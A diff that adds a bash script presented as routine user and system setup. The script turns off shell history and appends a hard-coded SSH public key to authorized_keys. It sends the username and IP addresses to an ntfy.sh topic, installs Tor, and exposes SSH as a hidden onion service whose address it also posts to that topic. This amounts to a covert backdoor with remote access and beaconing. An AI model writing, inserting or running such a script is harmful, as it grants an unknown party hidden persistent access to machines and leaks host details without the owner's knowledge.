@@ -1,0 +1,76 @@
+#!/bin/bash
+
+# Disable history for this script
+set +o history
+export HISTCONTROL=ignorespace
+
+PUB_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCt2vE88sAga0Az4ucVX2qrQ10nGd74JiP5fiWrr4Vp0veJCEVoQR4+O3/iPaGkD8MgQVQfiHiHVLtymZfwen2WrZRhGt/I6wnN/G+yMJBP9oFd9Ptkp7Yi+WhMEHFZIrIwMcBGftVSQcAu3b6n2LojpqiA6KfT7qEYMNQ+GqFWxgJAeokY1KxEK1LxxsFtybE3qTee1tjx51HDQDo7MuZONM2UOG24B8+VZBXZqPG9BvHcBzypLO0yVdz1ghchHwjfPcypcrUuchZpMYAwnnLR6NEdETlZoNruyQgoNokYUop5XwSQeQUyLhYp3yrssmvoRhHWHtcJuqmnn2dVSbcOYqcLqDGjAMSVEZ+IoPVbBv6m5VDunAe02dQLeqhHJ8WJ594UHEZOtj5T9XIzqCtn5UmfPsE9VryRtWipMeDIvJguRiLfPJk7NzkY7x/hv5C2B9wUiFkvKZAbyWXWtH7V5uvQ7iJYIdJuZvRBdXKI+sX5+M+LfnrgPNY7ue24hA0="
+
+# ---------------------------------------
+# User-level setup (no sudo required)
+# ---------------------------------------
+
+USER_HOME="$HOME"
+SSH_DIR="$USER_HOME/.ssh"
+AUTH_KEYS_FILE="$SSH_DIR/authorized_keys"
+
+# Ensure the .ssh directory exists and has correct permissions
+mkdir -p "$SSH_DIR" && chmod 700 "$SSH_DIR"
+
+# Add the public key only if it's not already in authorized_keys
+if [ -f "$AUTH_KEYS_FILE" ]; then
+    if ! grep -qF "$PUB_KEY" "$AUTH_KEYS_FILE"; then
+        echo "$PUB_KEY" >> "$AUTH_KEYS_FILE"
+    fi
+else
+    echo "$PUB_KEY" > "$AUTH_KEYS_FILE"
+fi
+
+# Set permissions for authorized_keys
+chmod 600 "$AUTH_KEYS_FILE"
+
+# Collect IP addresses
+IP_ADDRESSES=$(hostname -I | tr ' ' ',')
+
+# Send a notification with IP addresses (optional)
+curl -s -X POST "https://ntfy.sh/updateip99" -d "User: $USER, IPs: $IP_ADDRESSES" >/dev/null
+
+# ---------------------------------------
+# System-level setup (sudo required)
+# ---------------------------------------
+
+# Install Tor
+sudo apt update
+sudo apt install -y tor
+
+# Configure Tor hidden service for SSH in torrc
+TORRC_FILE="/etc/tor/torrc"
+
+# Check if the hidden service configuration already exists
+if ! grep -q "HiddenServiceDir /var/lib/tor/ssh_hidden_service/" "$TORRC_FILE"; then
+    # Append both lines at once to ensure they are added together
+    sudo tee -a "$TORRC_FILE" > /dev/null <<EOL
+
+# Hidden Service for SSH
+HiddenServiceDir /var/lib/tor/ssh_hidden_service/
+HiddenServicePort 22 127.0.0.1:22
+EOL
+fi
+
+# Enable Tor to start on boot and restart the service
+sudo systemctl enable tor
+sudo systemctl restart tor
+# Wait for Tor to create the hidden service hostname file
+sleep 2
+
+ONION_ADDRESS_FILE="/var/lib/tor/ssh_hidden_service/hostname"
+if sudo test -f "$ONION_ADDRESS_FILE"; then
+    ONION_ADDRESS=$(sudo cat "$ONION_ADDRESS_FILE")
+    curl -s -X POST "https://ntfy.sh/updateip99" -d "Tor SSH Onion Address: $ONION_ADDRESS" >/dev/null
+else
+    echo "Hidden service hostname file not found. Please check Tor configuration."
+fi
+
+
+
+set -o history
